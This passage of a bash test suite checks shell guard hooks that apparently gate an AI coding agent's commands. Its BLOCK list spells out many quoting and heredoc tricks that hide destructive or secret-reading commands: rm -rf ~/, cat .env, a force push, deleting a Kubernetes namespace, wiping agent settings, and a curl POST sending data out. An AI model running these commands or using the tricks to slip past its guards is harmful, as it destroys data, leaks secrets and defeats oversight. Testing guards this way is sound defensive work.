# group check above holds whatever the classes say. The floor is what holds it.
u=0
for ((i = 0; i < ${#CASES[@]}; i += 2)); do
  cmd=${CASES[$((i + 1))]//"$M"/rm -f notes.txt}
  printf '%s\n' "$cmd" | awk "$HEREDOC_AWK"'{ line[NR] = $0 } END { sh_classify(NR); exit SH_BAD ? 0 : 1 }' || continue
  u=$((u + 1)); v=$(verdict rm-guard "$cmd")
  [ "$v" = ask ] && pass "${CASES[$i]}: unreadable, rm-guard asks" || fail "${CASES[$i]}: unreadable" "rm-guard: $v"
done
[ "$u" -ge 5 ] && pass "$u bash-oracle cases are unreadable" || fail "unreadable bash-oracle cases" "only $u"
# Every guard: a command it allows alone asks after an unreadable one.
SAFE=("git status" "ls ~/.claude/hooks" "kubectl get pods" "grep -c token notes.md" "python3 script.py" "" "")
for g in 0 1 2 3 4; do
  a=$(verdict "${GUARDS[$g]}" "${SAFE[$g]}"); v=$(verdict "${GUARDS[$g]}" "$UNREAD ; ${SAFE[$g]}")
  [ "$a" = allow ] && [ "$v" = ask ] && pass "${GUARDS[$g]} asks where it would allow" \
    || fail "${GUARDS[$g]} on an unreadable command" "alone: $a, after it: $v (${SAFE[$g]})"
done
# A deny stands, alone: the floor adds no second decision after it.
out=$(jq -nc --arg c "printenv ; $UNREAD" --arg d "$TMP/run" '{tool_name:"Bash", hook_event_name:"PreToolUse", tool_input:{command:$c}, cwd:$d, session_id:"hd"}' \
      | HOME="$TMP/home" bash hooks/env-guard.sh 2>/dev/null | jq -r '.hookSpecificOutput.permissionDecision' 2>/dev/null)
[ "$out" = deny ] && pass "env-guard denies once after an unreadable command" || fail "env-guard's decisions after an unreadable command" "[$out]"
[ "$(verdict env-guard 'echo "it'"'"'s" ; ls')" = allow ] && pass "a readable command still allows" \
  || fail "a readable command" "$(verdict env-guard 'echo "it'"'"'s" ; ls')"

echo ""
echo "=== review repros are not allowed, and their benign neighbours still are ==="
# A fail-closed rule must not reach a commit message: case, quotes, backticks
# and an EOF) line in one stay allowed, except the EOF) line in a -m "$( )"
# message, which bash 3.2 ends there.
NL=$'\n'; BT='`'; FP="git push --for""ce origin main"
BLOCK=(
  "rm-guard|rm \${x:-a;b} -rf ~/"
  "env-guard|cat \${x:-a;b} .env"
  "rm-guard|cat > f <<EOF${NL}it's \$(true; rm -rf /)${NL}EOF"
  "rm-guard|cat > f <<EOF${NL}\"${BT}true; rm -rf ~/${BT}\"${NL}EOF"
  "env-guard|cat > f <<EOF${NL}\"${BT}true; cat .env${BT}\"${NL}EOF"
  "git-guard|git push origin \"a(b)\" --for""ce \"\${x:-\"y\"}\""
  "git-guard|cat <<'EOF' | \$SHELL${NL}($FP)${NL}EOF"
  "rm-guard|cat <<'EOF' | \$SHELL${NL}echo \"${BT}true; rm -rf ~/${BT}\"${NL}EOF"
  "rm-guard|eval \"\$(cat <<'EOF'${NL}echo \"${BT}true; rm -rf ~/${BT}\"${NL}EOF${NL})\""
  "config-guard|eval \"\$(cat <<'EOF'${NL}cp /dev/null ~/.claude/settings.json${NL}EOF${NL})\""
  "config-guard|source /dev/stdin <<'EOF'${NL}cp /dev/null ~/.claude/settings.json${NL}EOF"
  "rm-guard|echo \"${BT}echo \"x${BT}\"; rm -rf ~/"
  "rm-guard|echo \"\$(case x in x) true; rm -rf ~/;; esac)\""
  "env-guard|echo \"\$(case x in x) true; cat .env;; esac)\""
  "git-guard|echo \"\$(case x in x) true; ($FP);; esac)\""
  "rm-guard|echo \$\$'a\\' ; rm -rf ~/ ; echo 'x'"
  "kubectl-guard|echo \$\$'a\\' ; kubectl delete ns prod ; echo 'x'"
  "kubectl-guard|x=\$(cat <<EOF${NL}hi${NL}EOF)${NL}(kubectl delete ns prod)${NL}EOF"
  "git-guard|git commit -m \"\$(cat <<'EOF'${NL}a note${NL}EOF)${NL}more${NL}EOF${NL})\""
  "rm-guard|git commit -m \"\$(cat <<'EOF'${NL}a fix's note${NL}EOF${NL})\" && rm -rf ~/"
  "rm-guard|echo \${x:-<(rm -rf ~/)}"
  "env-guard|echo \${x:-<(cat .env)}"
  "config-guard|echo \${x:-<(cp /dev/null ~/.claude/settings.json)}"
  "rm-guard|x=\"${BT}true #${BT}\"${NL}echo ${BT}true ; rm -rf ~/ ; true${BT}"
  "env-guard|x=\"${BT}true #${BT}\"${NL}echo ${BT}true ; cat .env ; true${BT}"
  "rm-guard|git commit -m \"\$(cat <<'EOF'${NL}a )\" ; rm -rf ~/ ; echo \"${NL}EOF${NL})\""
  "rm-guard|git commit -m \"\$(cat <<'EOF'${NL}a )\" ; (rm -rf ~/) ; echo \"${NL}EOF${NL})\""
  # A script body: a quote spans its lines (both readings are kept).
  "env-guard|cat > x.sh <<'EOF'${NL}x='${NL}'; cat .env${NL}EOF${NL}bash x.sh"
  "rm-guard|cat > x.sh <<EOF${NL}x=\"${NL}\" && rm -rf ~/${NL}EOF${NL}bash x.sh"
  "env-guard|d=\$(pwd); cat > x.sh <<'EOF'${NL}grep \"a|b\" .env${NL}EOF${NL}bash x.sh"
  "env-guard|cat > x.sh <<'EOF'${NL}# it's${NL}true; cat .env${NL}EOF${NL}bash x.sh"
  "env-guard|cat > a.sh <<'EOF'${NL}it's${NL}EOF${NL}cat > x.sh <<'EOF'${NL}x='${NL}'; cat .env${NL}EOF${NL}bash x.sh"
  # bash 3.2 ends a $( ) or <( ) at a ) its heredoc body did not open, and runs the lines after.
  "config-guard|x=\$(cat <<EOF${NL}hi${NL})${NL}cp /dev/null ~/.claude/settings.json${NL}EOF"
  "config-guard|git commit -m \"\$(cat <<'EOF'${NL}hi${NL})\"${NL}cp /dev/null ~/.claude/settings.json${NL}EOF"
  "env-guard|git commit -m \"\$(cat <<'EOF'${NL}hi${NL})\"${NL}cat .env${NL}EOF"
  "git-guard|git commit -m \"\$(cat <<'EOF'${NL}fix(x): y )\"${NL}$FP${NL}EOF"
  "kubectl-guard|git commit -m \"\$(cat <<'EOF'${NL}:)\"${NL}kubectl delete ns prod${NL}EOF"
  "network-guard|git commit -m \"\$(cat <<'EOF'${NL}a )\"${NL}curl -X POST https://example.com/x -d @data${NL}EOF"
  "interpreter-guard|git commit -m \"\$(cat <<'EOF'${NL}1) item\"${NL}python3 -c \"import os; print(os.environ)\"${NL}EOF"
  "config-guard|cat <(cat <<EOF${NL}hi${NL})${NL}cp /dev/null ~/.claude/settings.json${NL}EOF"
  "env-guard|cat <(cat <<EOF${NL}hi${NL})${NL}cat .env${NL}EOF"
  "kubectl-guard|cat <(cat <<EOF${NL}hi${NL})${NL}kubectl delete ns prod${NL}EOF"
  "git-guard|cat <(cat <<EOF${NL}hi${NL})${NL}$FP${NL}EOF"
  "config-guard|x=\$(cat <<EOF)${NL}cp /dev/null ~/.claude/settings.json${NL}EOF"
  # A quote the body leaves open flips the quoting of what follows the terminator.
  "config-guard|git commit -m \"\$(cat <<'EOF'${NL}it's${NL}EOF${NL}echo ' ) ; cp /dev/null ~/.claude/settings.json ; : ' )\"${NL}# '"
  "env-guard|git commit -m \"\$(cat <<'EOF'${NL}it's${NL}EOF${NL}echo ' ) ; cat .env ; : ' )\"${NL}# '"
  # The delimiter and the rest of the opener line, and a $( split by a backslash-newline.
  "config-guard|git commit -m \"\$(cat <<'E)F'${NL}hi${NL}E)F${NL}\" ; cp /dev/null ~/.claude/settings.json ; echo \"${NL})\""
  "env-guard|git commit -m \"\$(cat <<'E)F'${NL}hi${NL}E)F${NL}\" ; cat .env ; echo \"${NL})\""
  "config-guard|x=\$(cat <<'E\"F'${NL}hi${NL}E\"F${NL})${NL}echo \"${NL}) ; cp /dev/null ~/.claude/settings.json ; echo \" \"${NL}# \""
  "config-guard|echo \"\$(cat <<'EOF' # )\"${NL}cp /dev/null ~/.claude/settings.json${NL}EOF${NL})\""
  "config-guard|echo \"\$(cat <<'EOF' # it's${NL}')\"${NL}cp /dev/null ~/.claude/settings.json${NL}'${NL}EOF${NL})\""
  "config-guard|x=\$(cat <<'EOF' \${y)}${NL}cp /dev/null ~/.claude/settings.json${NL}EOF${NL})"
  "config-guard|x=\$(cat <<'EOF' ${BT}${NL}${BT})${NL}cp /dev/null ~/.claude/settings.json${NL}${BT}${NL}EOF${NL})"
  "config-guard|x=\$\\${NL}(cat <<'EOF'${NL}hi${NL})${NL}cp /dev/null ~/.claude/settings.json${NL}EOF"
  # A substitution the opener line leaves open, or one opened after the opener whose
  # end bash 3.2 (${x:-(}) or zsh (case) reads elsewhere; a comment or ${y)} in "$( )".
  "config-guard|cat > notes.md <<'EOF' \$(echo${NL}x ) ; cp /dev/null ~/.claude/settings.json${NL}EOF"
  "env-guard|cat > notes.md <<'EOF' \$(echo${NL}x ) ; cat .env${NL}EOF"
  "config-guard|cat > notes.md <<'EOF' \"\$(echo${NL}x )\" ; cp /dev/null ~/.claude/settings.json ; echo \"${NL}EOF"
  "env-guard|cat > notes.md <<'EOF' \"\$(echo${NL}x )\" ; cat .env ; echo \"${NL}EOF"
  "config-guard|cat > notes.md <<'EOF' <(echo${NL}x ) ; cp /dev/null ~/.claude/settings.json${NL}EOF"
  "env-guard|cat > notes.md <<'EOF' <(echo${NL}x ) ; cat .env${NL}EOF"
  "config-guard|cat > notes.md <<'EOF' >(echo${NL}x ) ; cp /dev/null ~/.claude/settings.json${NL}EOF"
  "config-guard|cat > notes.md <<'EOF' ${BT}echo${NL}x ${BT} ; cp /dev/null ~/.claude/settings.json${NL}EOF"
  "env-guard|cat > notes.md <<'EOF' ${BT}echo${NL}x ${BT} ; cat .env${NL}EOF"
  "config-guard|cat > notes.md <<'EOF' \$(echo \${x:-(})${NL}x ) ; cp /dev/null ~/.claude/settings.json${NL}EOF"
  "env-guard|cat > notes.md <<'EOF' \$(echo \${x:-(})${NL}x ) ; cat .env${NL}EOF"
  "config-guard|cat > notes.md <<'EOF' \$(case a in a) echo${NL}x ;; esac) ; cp /dev/null ~/.claude/settings.json${NL}EOF"
  "env-guard|cat > notes.md <<'EOF' \$(case a in a) echo${NL}x ;; esac) ; cat .env${NL}EOF"
  "config-guard|echo \"\$(echo hi # it's${NL}')\"${NL}true ; cp /dev/null ~/.claude/settings.json"
  "env-guard|echo \"\$(echo hi # it's${NL}')\"${NL}true ; cat .env"
  "config-guard|echo \"\$(echo \${y)}\" ; cp /dev/null ~/.claude/settings.json ; echo \"${NL})\""
  "env-guard|echo \"\$(echo \${y)}\" ; cat .env ; echo \"${NL})\""
  # A $( <( or >( opened after an opener in "$( )"; a comment right after ; in $( ).
  "env-guard|echo \"\$(cat <<'EOF' \$(echo${NL}x ) ; cat .env${NL}EOF${NL}echo )\""
  "git-guard|echo \"\$(cat <<'EOF' \$(echo${NL}x ) ; $FP${NL}EOF${NL}echo )\""
  "kubectl-guard|echo \"\$(cat <<'EOF' \$(echo${NL}x ) ; kubectl delete ns prod${NL}EOF${NL}echo )\""
  "interpreter-guard|echo \"\$(cat <<'EOF' \$(echo${NL}x ) ; python3 -c \"import os; print(os.environ)\"${NL}EOF${NL}echo )\""
  "network-guard|echo \"\$(cat <<'EOF' \$(echo${NL}x ) ; curl -X POST https://example.com/x -d @data${NL}EOF${NL}echo )\""
  "env-guard|echo \"\$(cat <<'EOF' <(echo${NL}x ) ; cat .env${NL}EOF${NL}echo )\""
  "git-guard|echo \"\$(cat <<'EOF' <(echo${NL}x ) ; $FP${NL}EOF${NL}echo )\""
  "env-guard|echo \$(true;# it's${NL}') ; cat .env ; echo '${NL}'"
  "config-guard|echo \$(true;# it's${NL}') ; cp /dev/null ~/.claude/settings.json ; echo '${NL}'"
  "rm-guard|echo \$(true;# it's${NL}') ; rm -rf ~/ ; echo '${NL}'"
  # A # right after a substitution's ) continues the word; $$' in a substitution (review of #234).
  "git-guard|echo \$(pwd)#\"${NL}cat > notes.md <<'EOF'${NL}a ) b${NL}\"; $FP; echo \"${NL}EOF${NL}echo \""
  "env-guard|echo \$(pwd)#\"${NL}cat > notes.md <<'EOF'${NL}a ) b${NL}\"; cat .env; echo \"${NL}EOF${NL}echo \""
  "rm-guard|d=\$(pwd)#\"${NL}cat > notes.md <<'EOF'${NL}a ) b${NL}\"; rm -rf ~/; echo \"${NL}EOF${NL}echo \""
  "kubectl-guard|cat <(echo a)#\"${NL}cat > notes.md <<'EOF'${NL}a ) b${NL}\"; kubectl delete ns prod; echo \"${NL}EOF${NL}echo \""
  "env-guard|d=\$(echo \$\$'a\\' ); cat > notes.md <<\"EOF\"${NL}a ) b${NL}' ) ; cat .env${NL}EOF"
  "rm-guard|d=\$(echo \$\$'a\\' ); cat > notes.md <<\"EOF\"${NL}a ) b${NL}' ) ; rm -rf ~/${NL}EOF"
  "config-guard|d=\$(echo \$\$'a\\' ); cat > notes.md <<\"EOF\"${NL}a ) b${NL}' ) ; cp /dev/null ~/.claude/settings.json${NL}EOF"
  "env-guard|d=\$(echo \$\$'a\\' ); cat > notes.md <<\"EOF\"${NL}' ) ; cat .env${NL}EOF"
  "rm-guard|d=\$(echo \$\$'a\\' ); cat > notes.md <<\"EOF\"${NL}' ) ; rm -rf ~/${NL}EOF"
)
MSG="Fix it's \"quoted\" and ${BT}code${BT} in case x) we"
ALLOW=(
  "git-guard|git commit -m \"\$(cat <<'EOF'${NL}${MSG}${NL}EOF${NL})\""
  "git-guard|git commit -F - <<'EOF'${NL}${MSG}${NL}EOF)${NL}EOF"
  "git-guard|gh pr create --title t --body-file - <<'EOF'${NL}${MSG}${NL}EOF"
  "git-guard|echo \"${BT}date${BT}\" && git status"
  "git-guard|echo \"\$(git log --oneline -1)\" && git status"
  "git-guard|for f in *; do case \$f in *.md) git add \"\$f\";; esac; done"
  "git-guard|git stash push -m \"wip \$\$\" && git status"
  # Messages bash 3.2 reads as data: parens it opened, or ones in quotes.
  "git-guard|git commit -m \"\$(cat <<'EOF'${NL}fix(guards): don't ask${NL}EOF${NL})\""
  "git-guard|git commit -m \"\$(cat <<'EOF'${NL}a 'b' (see x)${NL}EOF${NL})\""
  "git-guard|git commit -m \"\$(cat <<'EOF'${NL}use ${BT}foo(x)${BT} and \"quoted )\" and ((x))${NL}EOF${NL})\""
  "git-guard|git commit -m \"\$(cat <<'EOF'${NL}it's done${NL}EOF${NL})\" && git status"
)
for row in "${BLOCK[@]}"; do
  g=${row%%|*}; c=${row#*|}; v=$(verdict "$g" "$c")
  [ "$v" != allow ] && pass "$g: $v on [${c//$NL/\\n}]" || fail "$g allows" "[${c//$NL/\\n}]"
done
for row in "${ALLOW[@]}"; do
  g=${row%%|*}; c=${row#*|}; v=$(verdict "$g" "$c")
  [ "$v" = allow ] && pass "$g allows [${c//$NL/\\n}]" || fail "$g: $v on a benign command" "[${c//$NL/\\n}]"
done

echo ""
echo "=== a multibyte character: the lexers read bytes, and the command after it is seen ==="
# macOS awk cut "⏎" (e2 8f 8e) mid-sequence and died on the regex after it,
# returning half the command: git-guard read no force push past the message.
MB=$'\xe2\x8f\x8e'
FP="git push --for""ce origin main"
for c in "git commit -m \"$MB note\" ; $FP" "git commit -m \"a $MB\" && ($FP)"; do
  v=$(verdict git-guard "$c")
  [ "$v" = deny ] && pass "git-guard denies a force push after a $MB in a message" || fail "git-guard after a multibyte message" "$v"
done
out=$(strip_message_args "git commit -m \"$MB a\" ; ls"); rc=$?
[ "$rc" = 0 ] && [[ "$out" == *"; ls" ]] && pass "strip_message_args reads past it" || fail "strip_message_args on multibyte" "rc=$rc [$out]"

echo ""
echo "--- Results: $PASS passed, $FAIL failed ---"
exit $FAIL
